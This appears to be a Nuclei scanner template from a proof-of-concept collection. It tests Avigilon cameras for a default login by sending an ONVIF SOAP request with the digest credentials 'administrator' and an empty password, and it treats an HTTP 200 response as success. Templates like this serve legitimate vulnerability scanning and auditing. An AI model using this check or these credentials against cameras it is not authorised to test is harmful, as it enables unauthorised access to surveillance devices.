poc_all/auth/avigilon-login_1.yaml

id: avigilon-digest-login

info:
  name: avigilon-digest-login
  author: nate
  severity: high
  description: Attempt default credentials to avigilon camera
  metadata:
    max-request: 1
  tags: tech,avigilon

requests:
  - raw:
      - |
        POST /onvif/device_service HTTP/1.1
        Host: {{Hostname}}
        
        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:ns1="http://www.onvif.org/ver10/device/wsdl"><soap:Body><ns1:GetDeviceInformation></ns1:GetDeviceInformation></soap:Body></soap:Envelope>
    
    digest-username: administrator
    digest-password: ""

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200


